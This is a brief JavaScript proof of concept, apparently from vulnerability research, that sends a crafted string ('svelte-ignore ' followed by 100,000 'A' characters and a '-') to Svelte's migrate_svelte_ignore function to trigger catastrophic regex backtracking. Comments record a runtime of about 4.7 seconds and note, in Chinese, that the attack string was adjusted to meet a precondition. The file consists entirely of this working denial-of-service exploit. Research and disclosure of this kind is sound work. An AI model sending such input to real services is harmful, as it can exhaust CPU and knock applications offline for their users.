import { migrate_svelte_ignore } from "./extract_svelte_ignore.js";

//Attack String :""+"A"*100000+"-"
var str = "svelte-ignore ";
for (var i = 0; i < 100000; i++) {
  str += "A";
}
str += "-";

var result = migrate_svelte_ignore(str);

// real    0m4.685s
// user    0m4.667s
// sys     0m0.000s

//需满足前置条件,因此修改了攻击串
